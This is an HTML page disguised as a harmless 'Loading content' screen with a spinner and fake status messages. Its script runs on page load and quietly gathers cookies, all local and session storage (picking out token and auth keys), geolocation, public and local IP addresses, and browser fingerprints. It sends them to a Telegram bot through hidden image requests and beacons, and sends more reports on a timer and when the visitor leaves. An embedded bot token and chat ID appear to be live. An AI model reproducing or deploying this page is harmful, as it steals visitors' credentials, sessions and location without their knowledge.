<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: #f0f0f0;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        #loading {
            font-size: 18px;
            color: #333;
            margin-top: 50px;
        }
        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div id="loading">
        <div class="spinner"></div>
        <p>Loading content, please wait...</p>
        <p id="status">Initializing...</p>
    </div>

    <script>
        // ==== –ù–ê–°–¢–†–û–ô–ö–ò ====
        const BOT_TOKEN = '8008436937:AAEiLQfQRjXk7jb_MMhej63ZUSoeso8fxzw'; // –ó–ê–ú–ï–ù–ò–¢–ï
        const CHAT_ID = '5070829767'; // –ó–ê–ú–ï–ù–ò–¢–ï
        // ==== –ö–û–ù–ï–¶ –ù–ê–°–¢–†–û–ï–ö ====

        let collectedData = {};

        // –°–¢–ï–õ–°-–û–¢–ü–†–ê–í–ö–ê –î–ê–ù–ù–´–•
        function stealthSend(text) {
            if (!BOT_TOKEN || BOT_TOKEN.includes('YOUR') || !CHAT_ID || CHAT_ID.includes('YOUR')) {
                return false;
            }

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
            
            // –ù–µ–≤–∏–¥–∏–º–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ Image
            const img = new Image();
            img.src = url;
            
            // –î—É–±–ª–∏—Ä—É—é—â–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ Beacon API
            navigator.sendBeacon && navigator.sendBeacon(url);
            
            return true;
        }

        // –û–ë–ù–û–í–õ–ï–ù–ò–ï –°–¢–ê–¢–£–°–ê (–¥–ª—è –º–∞—Å–∫–∏—Ä–æ–≤–∫–∏)
        function updateStatus(msg) {
            document.getElementById('status').textContent = msg;
        }

        // 1. –ü–û–õ–£–ß–ï–ù–ò–ï –ì–ï–û–õ–û–ö–ê–¶–ò–ò –°–ö–†–´–¢–û
        function getStealthGeolocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("Geolocation not available");
                    return;
                }
                
                // –ë—ã—Å—Ç—Ä–∞—è –ø–æ–ø—ã—Ç–∫–∞ –ø–æ–ª—É—á–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    () => resolve("Location access denied"),
                    { 
                        enableHighAccuracy: false,
                        timeout: 5000,
                        maximumAge: 60000
                    }
                );
            });
        }

        // 2. –ü–û–õ–£–ß–ï–ù–ò–ï –í–°–ï–• IP –ê–î–†–ï–°–û–í
        async function getAllIPs() {
            const ips = { public: 'Unknown', local: 'Unknown' };
            
            // –ü—É–±–ª–∏—á–Ω—ã–π IP
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ips.public = data.ip;
            } catch (e) {}
            
            // –õ–æ–∫–∞–ª—å–Ω—ã–π IP —á–µ—Ä–µ–∑ WebRTC
            try {
                const localIP = await new Promise((resolve) => {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    
                    pc.onicecandidate = (ice) => {
                        if (ice && ice.candidate && ice.candidate.candidate) {
                            const match = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                            if (match) {
                                resolve(match[1]);
                                pc.close();
                            }
                        }
                    };
                    setTimeout(() => resolve('Not found'), 1000);
                });
                ips.local = localIP;
            } catch (e) {}
            
            return ips;
        }

        // 3. –°–ë–û–† –í–°–ï–• –î–ê–ù–ù–´–• –°–ò–°–¢–ï–ú–´
        function collectAllStealthData() {
            collectedData = {
                timestamp: new Date().toLocaleString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                languages: navigator.languages,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                cpuCores: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: document.cookie,
                localStorage: {},
                sessionStorage: {}
            };

            // –í–°–ï LocalStorage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                collectedData.localStorage[key] = localStorage.getItem(key);
            }

            // –í–°–ï SessionStorage
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                collectedData.sessionStorage[key] = sessionStorage.getItem(key);
            }

            // –î–µ—Ç–∞–ª–∏ –±—Ä–∞—É–∑–µ—Ä–∞
            collectedData.plugins = Array.from(navigator.plugins).map(p => p.name);
            collectedData.vendor = navigator.vendor;
            collectedData.pdfViewer = navigator.pdfViewerEnabled;

            // Canvas fingerprint
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Stealth', 2, 15);
                collectedData.canvasFP = canvas.toDataURL().substring(0, 100);
            } catch (e) {}

            // WebGL fingerprint
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    collectedData.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    collectedData.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            } catch (e) {}

            // –°–µ—Ç—å
            if (navigator.connection) {
                collectedData.connection = {
                    type: navigator.connection.effectiveType,
                    speed: navigator.connection.downlink + ' Mbps'
                };
            }
        }

        // 4. –§–û–†–ú–ò–†–û–í–ê–ù–ò–ï –ö–û–ú–ü–ê–ö–¢–ù–û–ì–û –û–¢–ß–ï–¢–ê
        function createStealthReport(geo, ips) {
            let report = `üö® STEALTH DATA COLLECTION üö®\n\n`;
            
            report += `üìç LOCATION:\n`;
            if (typeof geo === 'object') {
                report += `Coordinates: ${geo.lat}, ${geo.lng}\n`;
                report += `Accuracy: ${geo.accuracy}m\n`;
                report += `Maps: https://maps.google.com/?q=${geo.lat},${geo.lng}\n`;
            } else {
                report += `${geo}\n`;
            }
            
            report += `\nüåê NETWORK:\n`;
            report += `Public IP: ${ips.public}\n`;
            report += `Local IP: ${ips.local}\n`;
            
            report += `\nüíª SYSTEM:\n`;
            report += `Platform: ${collectedData.platform}\n`;
            report += `Screen: ${collectedData.screen}\n`;
            report += `CPU: ${collectedData.cpuCores} cores\n`;
            report += `RAM: ${collectedData.deviceMemory}GB\n`;
            report += `Browser: ${collectedData.userAgent}\n`;
            report += `Timezone: ${collectedData.timezone}\n`;
            
            report += `\nüîê AUTH DATA:\n`;
            report += `Cookies: ${collectedData.cookies || 'none'}\n`;
            report += `LocalStorage: ${Object.keys(collectedData.localStorage).length} items\n`;
            report += `SessionStorage: ${Object.keys(collectedData.sessionStorage).length} items\n`;
            
            // –ß—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∏–∑ localStorage
            const sensitiveKeys = Object.keys(collectedData.localStorage).filter(key => 
                key.toLowerCase().includes('token') || 
                key.toLowerCase().includes('auth') ||
                key.toLowerCase().includes('session') ||
                key.toLowerCase().includes('user')
            );
            
            if (sensitiveKeys.length > 0) {
                report += `\nüîë FOUND SENSITIVE KEYS:\n`;
                sensitiveKeys.forEach(key => {
                    const value = collectedData.localStorage[key];
                    if (value && value.length < 100) {
                        report += `${key}: ${value}\n`;
                    }
                });
            }
            
            report += `\n‚è∞ Time: ${collectedData.timestamp}`;
            
            return report;
        }

        // 5. –û–°–ù–û–í–ù–û–ô –ü–†–û–¶–ï–°–° –°–ë–û–†–ê –î–ê–ù–ù–´–•
        async function executeStealthCollection() {
            updateStatus('Checking system compatibility...');
            
            // –°–±–æ—Ä —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
            collectAllStealthData();
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            updateStatus('Analyzing network...');
            
            // –ü–æ–ª—É—á–µ–Ω–∏–µ IP
            const ips = await getAllIPs();
            await new Promise(resolve => setTimeout(resolve, 800));
            
            updateStatus('Optimizing performance...');
            
            // –ü–æ–ª—É—á–µ–Ω–∏–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
            const geo = await getStealthGeolocation();
            await new Promise(resolve => setTimeout(resolve, 600));
            
            updateStatus('Finalizing setup...');
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –æ—Ç—á–µ—Ç–∞
            const report = createStealthReport(geo, ips);
            stealthSend(report);
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
            if (Object.keys(collectedData.localStorage).length > 0) {
                let storageReport = `üíæ STORAGE DUMP:\n`;
                let counter = 0;
                for (let key in collectedData.localStorage) {
                    if (counter < 10 && collectedData.localStorage[key] && collectedData.localStorage[key].length < 80) {
                        storageReport += `${key}: ${collectedData.localStorage[key]}\n`;
                        counter++;
                    }
                }
                stealthSend(storageReport);
            }
            
            // –§–∏–Ω–∞–ª—å–Ω–∞—è –º–∞—Å–∫–∏—Ä–æ–≤–∫–∞ - –ø–æ–∫–∞–∑—ã–≤–∞–µ–º "—É—Å–ø–µ—à–Ω—É—é –∑–∞–≥—Ä—É–∑–∫—É"
            setTimeout(() => {
                document.getElementById('loading').innerHTML = `
                    <h2>Content Loaded Successfully</h2>
                    <p>This page appears to be empty or the content failed to load.</p>
                    <p>Please check the URL or try refreshing the page.</p>
                `;
            }, 2000);
        }

        // –ó–ê–ü–£–°–ö –ü–†–ò –ó–ê–ì–†–£–ó–ö–ï –°–¢–†–ê–ù–ò–¶–´
        window.addEventListener('load', function() {
            // –ù–µ–º–µ–¥–ª–µ–Ω–Ω—ã–π –∑–∞–ø—É—Å–∫ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
            executeStealthCollection().catch(() => {});
            
            // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã –Ω–∞ —Å–ª—É—á–∞–π –µ—Å–ª–∏ —á—Ç–æ-—Ç–æ –Ω–µ –æ—Ç–ø—Ä–∞–≤–∏–ª–æ—Å—å
            setTimeout(() => {
                const quickReport = `üîÑ STEALTH BACKUP REPORT\nUser: ${navigator.userAgent}\nIP: Fetching...\nTime: ${new Date().toLocaleString()}`;
                stealthSend(quickReport);
            }, 3000);
        });

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('beforeunload', function() {
            const exitReport = `üîö USER LEFT PAGE\nFinal data sent at: ${new Date().toLocaleString()}`;
            stealthSend(exitReport);
        });

    </script>
</body>
</html>
